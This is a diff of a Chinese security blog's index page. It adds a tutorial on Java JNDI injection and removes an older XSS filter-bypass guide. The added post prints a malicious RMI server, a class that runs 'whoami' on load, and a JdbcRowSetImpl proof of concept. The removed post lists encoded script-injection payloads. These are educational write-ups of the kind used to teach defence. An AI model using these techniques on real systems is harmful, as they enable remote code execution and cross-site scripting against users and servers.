@@ -248,6 +248,159 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/05/09/深入理解JAVA中的JNDI注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/05/09/深入理解JAVA中的JNDI注入/" itemprop="url">深入理解JAVA中的JNDI注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-05-09T17:17:23+08:00">
+                2020-05-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="什么是JNDI"><a href="#什么是JNDI" class="headerlink" title="什么是JNDI?"></a>什么是JNDI?</h2><blockquote>
+<p>简单来说，<code>JNDI</code> (Java Naming and Directory Interface) 是一组应用程序接口，它为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用<code>JNDI</code>在局域网上定位一台打印机，也可以用<code>JNDI</code>来定位数据库服务或一个远程Java对象。<code>JNDI</code>底层支持<code>RMI</code>远程对象，<code>RMI</code>注册的服务可以通过JNDI接口来访问和调用。</p>
+<p><code>JNDI</code>支持多种命名和目录提供程序（Naming and Directory Providers），<code>RMI</code>注册表服务提供程序（RMI Registry Service Provider）允许通过<code>JNDI</code>应用接口对<code>RMI</code>中注册的远程对象进行访问操作。将<code>RMI</code>服务绑定到<code>JNDI</code>的一个好处是更加透明、统一和松散耦合，<code>RMI</code>客户端直接通过URL来定位一个远程对象，而且该<code>RMI</code>服务可以和包含人员，组织和网络资源等信息的企业目录链接在一起。</p>
+</blockquote>
+<img src="/2020/05/09/深入理解JAVA中的JNDI注入/1.png" alt="1.png" title="">
+<p>就个人的理解，<code>JNDI</code>相当于在<code>LDAP</code> <code>RMI</code>等服务外面再套了一层<code>API</code>，方便统一调用。</p>
+<h2 id="JNDI的注入点"><a href="#JNDI的注入点" class="headerlink" title="JNDI的注入点"></a>JNDI的注入点</h2><p>假设client端地址为<code>10.0.0.1</code>，先来看下面一段，JNDI的client端的代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(providerURL)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>其中<code>providerURL</code>为可控变量，此时，可以传入任意JNDI服务路径来实现注入，如<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?providerURL=rmi:<span class="comment">//10.0.0.2:9527/evil</span></div></pre></td></tr></table></figure></p>
+<p>但是问题来了，此时即使执行了evil所绑定的类，依然是在<code>10.0.0.2</code>上执行，无法影响到<code>10.0.0.1</code>，因此要引入一个新的概念</p>
+<h2 id="JNDI-References"><a href="#JNDI-References" class="headerlink" title="JNDI References"></a>JNDI References</h2><blockquote>
+<p>在JNDI服务中，RMI服务端除了直接绑定远程对象之外，还可以通过References类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了Reference之后，服务端会先通过Referenceable.getReference()获取绑定对象的引用，并且在目录中保存。当客户端在lookup()查找这个远程对象时，客户端会获取相应的object factory，最终通过factory类将reference转换为具体的对象实例。</p>
+</blockquote>
+<p>通过查阅References的源码，可以得知，其主要记录了如下信息<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> className;</div><div class="line"><span class="keyword">protected</span> Vector&lt;RefAddr&gt; addrs = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactory = <span class="built_in">null</span>;</div><div class="line"><span class="keyword">protected</span> <span class="built_in">String</span> classFactoryLocation = <span class="built_in">null</span>;</div></pre></td></tr></table></figure></p>
+<p>其中<code>classFactoryLocation</code>实际上是<code>LDAP</code>或者<code>RMI</code>的地址</p>
+<h2 id="真正的JNDI注入"><a href="#真正的JNDI注入" class="headerlink" title="真正的JNDI注入"></a>真正的JNDI注入</h2><p>假设server地址为<code>10.0.0.2</code>，构造如下恶意<code>RMI</code>服务代码<br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Registry registry = LocateRegistry.createRegistry(<span class="number">9527</span>);</div><div class="line">Reference <span class="built_in">exec</span> = <span class="keyword">new</span> Reference(<span class="string">"Exec"</span>, <span class="string">"Exec"</span>, <span class="string">"http://127.0.0.1:8080/"</span>);</div><div class="line">ReferenceWrapper refWrap = <span class="keyword">new</span> ReferenceWrapper(<span class="built_in">exec</span>);</div><div class="line"><span class="keyword">System</span>.out.println(<span class="string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:9527/exec"</span>);</div><div class="line">registry.bind(<span class="string">"exec"</span>, refWrap);</div></pre></td></tr></table></figure></p>
+<p>上述代码非常简单，主要是将<code>/exec</code>这个路径绑定到一个<code>Reference</code>上，而这个<code>Reference</code>指向<code>127.0.0.1:8080/Exec.class</code>,其中<code>Reference</code>的构造函数第一个参数是<code>className</code>,第二个参数是<code>classFactory</code></p>
+<p>紧接着让我们构造<code>Exec</code>这个恶意类<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.InputStreamReader;</div><div class="line"><span class="keyword">import</span> java.io.OutputStream;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="keyword">class</span> Exec &#123;</div><div class="line">    <span class="keyword">public</span> Exec() throws Exception&#123;</div><div class="line">        <span class="keyword">String</span> cmd = <span class="string">"whoami"</span>;</div><div class="line">        <span class="built_in">Process</span> p = Runtime.getRuntime().exec(cmd);</div><div class="line">        InputStream is = p.getInputStream();</div><div class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line"></div><div class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</div><div class="line">        <span class="keyword">int</span> a = <span class="number">-1</span>;</div><div class="line">        <span class="built_in">while</span> ((a = is.<span class="built_in">read</span>(b)) != <span class="number">-1</span>)&#123;</div><div class="line">            baos.<span class="built_in">write</span>(b, <span class="number">0</span>, a);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        System.out.<span class="built_in">println</span>(<span class="keyword">new</span> <span class="keyword">String</span>(baos.toByteArray()));</div><div class="line"></div><div class="line">        p.waitFor();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将其编译为<code>Exec.class</code>文件，然后拷贝到web目录下<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">javac</span> <span class="selector-tag">Exec</span><span class="selector-class">.java</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cp Exec.<span class="keyword">class</span> <span class="regexp">/var/</span>www<span class="regexp">/html/</span></div></pre></td></tr></table></figure>
+<p>假设client地址为<code>10.0.0.1</code>，构造如下漏洞代码<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"java.rmi.server.useCodebaseOnly"</span>, <span class="string">"false"</span>)<span class="comment">;</span></div><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="built_in">Context</span> <span class="built_in">context</span> = new  InitialContext()<span class="comment">;</span></div><div class="line"><span class="built_in">context</span>.lookup(<span class="string">"rmi://127.0.0.1/exec"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
+<p>即可成功执行<code>whoami</code>命令<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/2.png" alt="2.png" title=""><br>其中前两行代码主要用于解除安全限制</p>
+<blockquote>
+<p>在RMI服务中引用远程对象将受本地Java环境限制即本地的java.rmi.server.useCodebaseOnly配置必须为false(允许加载远程对象)，如果该值为true则禁止引用远程对象。除此之外被引用的ObjectFactory对象还将受到com.sun.jndi.rmi.object.trustURLCodebase配置限制，如果该值为false(不信任远程引用对象)一样无法调用远程的引用对象。</p>
+<p>JDK 5 U45,JDK 6 U45,JDK 7u21,JDK 8u121开始java.rmi.server.useCodebaseOnly默认配置已经改为了true。</p>
+<p>JDK 6u132, JDK 7u122, JDK 8u113开始com.sun.jndi.rmi.object.trustURLCodebase默认值已改为了false。</p>
+</blockquote>
+<h2 id="深入源码探索"><a href="#深入源码探索" class="headerlink" title="深入源码探索"></a>深入源码探索</h2><p>前面提到了，实际原因是触发了object factory，下面我们来看一下具体的触发调用链<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/3.png" alt="3.png" title=""><br>核心代码触发代码从<code>decodeObject</code>开始<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">var1</span>为传入的remote接口对象</div><div class="line">Object var3 = <span class="built_in">var1</span> instanceof RemoteReference ? ((RemoteReference)<span class="built_in">var1</span>).getReference() : <span class="built_in">var1</span>;</div></pre></td></tr></table></figure></p>
+<p>在<code>decodeObject</code>中，会判断传入对象是满足<code>RemoteReference</code>接口，满足则通过<code>getReference</code>函数获取<code>reference</code>对象，然后进入<code>getObjectInstance</code>函数<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (<span class="keyword">ref</span> != <span class="literal">null</span>) &#123;</div><div class="line">            String f = <span class="keyword">ref</span>.getFactoryClassName();</div><div class="line">            <span class="keyword">if</span> (f != <span class="literal">null</span>) &#123;</div><div class="line">                <span class="comment">// if reference identifies a factory, use exclusively</span></div><div class="line"></div><div class="line">                factory = getObjectFactoryFromReference(<span class="keyword">ref</span>, f); <span class="comment">//触发点1</span></div><div class="line">                <span class="keyword">if</span> (factory != <span class="literal">null</span>) &#123;</div><div class="line">                    <span class="keyword">return</span> factory.getObjectInstance(<span class="keyword">ref</span>, name, nameCtx,</div><div class="line">                                                     environment); <span class="comment">//触发点2</span></div><div class="line">                &#125;</div><div class="line">                <span class="comment">// No factory found, so return original refInfo.</span></div><div class="line">                <span class="comment">// Will reach this point if factory class is not in</span></div><div class="line">                <span class="comment">// class path and reference does not contain a URL for it</span></div><div class="line">                <span class="keyword">return</span> refInfo;</div></pre></td></tr></table></figure></p>
+<p>在<code>getObjectInstance</code>函数中，一共有两处可执行<code>RMI</code>中定义的恶意代码的地方，一处是<code>getObjectFactoryFromReference</code>，在<code>getObjectFactoryFromReference</code>中会通过获取到对应的<code>Class</code>对象，通过<code>clas.newInstance()</code>触发恶意构造函数<br><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> (clas != null) ? (ObjectFactory) clas.newInstance() : <span class="keyword"><span class="keyword">null</span></span>;</div></pre></td></tr></table></figure></p>
+<p>另外一处，则是通过实例化的类，调用其<code>getObjectInstance</code>函数，只要我们实现了<code>ObjectFactory</code>接口，复写<code>getObjectInstance</code>函数，即可执行恶意代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exec</span> <span class="keyword">implements</span> <span class="title">ObjectFactory</span> </span>&#123;</div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exec</span><span class="params">()</span></span>&#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception </span>&#123;</div><div class="line">        System.out.println(<span class="string">"factory.getObjectInstance hook!"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="JdbcRowSetImpl的JNDI注入利用链"><a href="#JdbcRowSetImpl的JNDI注入利用链" class="headerlink" title="JdbcRowSetImpl的JNDI注入利用链"></a>JdbcRowSetImpl的JNDI注入利用链</h2><p>在实战过程中，<code>context.lookup</code>直接被外部调用的情况比较少，但是我们可以通过间接调用<code>context.lookup</code>实现JNDI的注入，<code>JdbcRowSetImpl</code>就是这样一条利用链，先来看一下最终的POC<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>)<span class="comment">;</span></div><div class="line"><span class="keyword">JdbcRowSetImpl </span><span class="keyword">j </span>= new <span class="keyword">JdbcRowSetImpl();</span></div><div class="line"><span class="keyword">j.setDataSourceName("rmi://127.0.0.1:9527/exec");</span></div><div class="line"><span class="keyword">j.setAutoCommit(true);</span></div></pre></td></tr></table></figure></p>
+<p>调用链如下<br><img src="/2020/05/09/深入理解JAVA中的JNDI注入/4.png" alt="4.png" title=""><br>可以看到，唯一的不同在于<code>lookup</code>前调用了<code>setAutoCommit</code>以及<code>connect</code>方法</p>
+<h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>1.在POC复现的过程中，由于编译<code>Exec</code>使用了1.8，运行<code>Server</code>以及<code>Client</code>使用了1.7，导致无法运行。由于JAVA版本向下兼容，因此实际利用过程中，建议使用1.6编译<code>Exec.class</code>，笔者偷懒，均采用了1.8</p>
+<p>2.<code>Exec</code>的声明不能带package，否则无法触发，具体原因仍未查明。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2020/03/16/Windows下常见提权方式/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1713,180 +1866,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/05/27/XSS不完全指南/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="D_infinite">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="D_infinite的小站">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/05/27/XSS不完全指南/" itemprop="url">XSS不完全指南</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-27T14:20:34+08:00">
-                2017-05-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/XSS/" itemprop="url" rel="index">
-                    <span itemprop="name">XSS</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="XSS不完全指南-绕过篇"><a href="#XSS不完全指南-绕过篇" class="headerlink" title="XSS不完全指南(绕过篇)"></a>XSS不完全指南(绕过篇)</h2><p>笔者在刚接触XSS的时候觉得XSS很简单，不就是注入<code>alert(1)</code>嘛。直到最近从新开始研究XSS，才发现，XSS套路太深。因此希望通过文字总结经验，让自己有所收获。</p>
-<h3 id="1-ES6"><a href="#1-ES6" class="headerlink" title="1.ES6"></a>1.ES6</h3><p>ES6中更新了许多新特性，看图：<br><img src="/images/XSS不完全指南/1495704711780.png" alt="ES6新特性"><br>根据这些特性，首先想到的是，注入JS代码可以不用<code>&#39;</code>,<code>&quot;</code>，直接使用</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">alert</span><span class="params">(`abc`)</span></span></div></pre></td></tr></table></figure>
-<p>再看图最下方的特性，允许前面调用标签，即函数。而传入的值则为模板字符串。那么注入代码简写为：</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert`abc`</div></pre></td></tr></table></figure>
-<p>同时，ES6中允许使用码点表示UNICODE字符。例：<code>\u0001</code><br>那么，注入代码将如下:</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074`A`</div></pre></td></tr></table></figure>
-<h3 id="2-HTML-5-实体编码"><a href="#2-HTML-5-实体编码" class="headerlink" title="2.HTML(5)实体编码"></a>2.HTML(5)实体编码</h3><p><img src="/images/XSS不完全指南/1495712162824.png" alt="HTML5实体编码"><br>比较常用的是<code>&lt;</code> <code>&gt;</code> <code>=</code> <code>&#39;</code><br>代码构造如下：</p>
-<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;<span class="keyword">lt</span>;script&amp;<span class="keyword">gt</span>;alert`<span class="number">1</span>`&amp;<span class="keyword">lt</span>;/script&amp;<span class="keyword">gt</span>;</div></pre></td></tr></table></figure>
-<p>在HTML5中，新增了一些新的实体编码名称。如：<code>&amp;colon;</code> <code>&amp;NewLine;</code><br>则可构造：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript&amp;colon;alert</span>`<span class="attr">abc</span>` /&gt;</span></div></pre></td></tr></table></figure>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javas&amp;NewLine;criptalert</span>`<span class="attr">abc</span>` /&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="3-URL编码"><a href="#3-URL编码" class="headerlink" title="3.URL编码"></a>3.URL编码</h3><p><img src="/images/XSS不完全指南/1495720543817.png" alt="URL编码"><br>这个就是老生常谈了。随便举个栗子：</p>
-<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">%</span><span class="number">3</span>Cscript<span class="meta">%</span><span class="number">3</span>Ealert<span class="meta">%</span><span class="number">281</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">3</span>C<span class="meta">%</span><span class="number">2</span>Fscript<span class="meta">%</span><span class="number">3</span>E<span class="comment">//&lt;script&gt;alert(1)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
-<p>但是现在这种漏洞不容易触发，原因是因为许多网站后端都对双引号有解码过滤机制。</p>
-<h3 id="4-JS进制转换"><a href="#4-JS进制转换" class="headerlink" title="4.JS进制转换"></a>4.JS进制转换</h3><p>JS中会自动对以<code>\</code>开头的部分格式字符进行转换。如<code>\xnn</code>(十六进制),<code>\nnn</code>(八进制)，因此可构造如下：</p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">document.write("<span class="symbol">\7</span>4<span class="symbol">\1</span>63<span class="symbol">\1</span>43<span class="symbol">\1</span>62<span class="symbol">\1</span>51<span class="symbol">\1</span>60<span class="symbol">\1</span>64<span class="symbol">\7</span>6<span class="symbol">\1</span>41<span class="symbol">\1</span>54<span class="symbol">\1</span>45<span class="symbol">\1</span>62<span class="symbol">\1</span>64<span class="symbol">\5</span>0<span class="symbol">\6</span>1<span class="symbol">\5</span>1<span class="symbol">\7</span>4<span class="symbol">\5</span>7<span class="symbol">\1</span>63<span class="symbol">\1</span>43<span class="symbol">\1</span>62<span class="symbol">\1</span>51<span class="symbol">\1</span>60<span class="symbol">\1</span>64<span class="symbol">\7</span>6");</div><div class="line">//&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
-<h3 id="5-利用data协议"><a href="#5-利用data协议" class="headerlink" title="5.利用data协议"></a>5.利用data协议</h3><p>关于HTML中的data协议，可以点击<a href="http://www.cnblogs.com/hustskyking/p/data-uri.html" target="_blank" rel="external">这里</a></p>
-<p>总的来讲，data协议就是用文本流的方式，在HTML页面中插入文件。这里的文件形态即为<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="external">MIME-TYPE</a>。<br>使用方式如下：</p>
-<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data:[<span class="string">&lt;mime type&gt;</span>][<span class="symbol">;charset=&lt;charset&gt;</span>][<span class="string">;base64</span>],<span class="xml"><span class="tag">&lt;<span class="name">encoded</span> <span class="attr">data</span>&gt;</span></span></div></pre></td></tr></table></figure>
-<p>可以看到，当中可指定base64选项，即采用base64进行解码。注入代码可构造为：</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="6-空格的替代"><a href="#6-空格的替代" class="headerlink" title="6.空格的替代"></a>6.空格的替代</h3><p>在HTML中可以使用<code>/</code>代替空格，这也是老套路了。</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
-<p>当然，除了<code>/</code>之外，还有<code>%0A</code>(换行符),<code>%0C</code>(换页符),<code>%0D</code>(回车符)。有兴趣自己尝试。</p>
-<p>而在JS当中，则可以通过<code>/**/</code>空注释来代替空格</p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a/href=javascript:<span class="function"><span class="keyword">function</span>/**/<span class="title">ok</span><span class="params">()</span>&#123;<span class="title">alert</span><span class="params">(1)</span>&#125;/**/<span class="title">ok</span><span class="params">()</span>;&gt;<span class="title">xss</span>&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>
-<h3 id="7-运算符的利用"><a href="#7-运算符的利用" class="headerlink" title="7.运算符的利用"></a>7.运算符的利用</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.<span class="built_in">write</span>(<span class="string">"xxxx &#123;input&#125; xxxx"</span>)</div></pre></td></tr></table></figure>
-<p>input构造：</p>
-<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'-alert(1)-'</span></div></pre></td></tr></table></figure>
-<p>最终变成：</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(<span class="string">"xxxx"</span>-alert(<span class="number">1</span>)-<span class="string">"xxxx"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure>
-<p>而在JS当中，运算中的子单元，如果是JS代码，会自动执行。因此成功弹窗。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1937,7 +1916,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
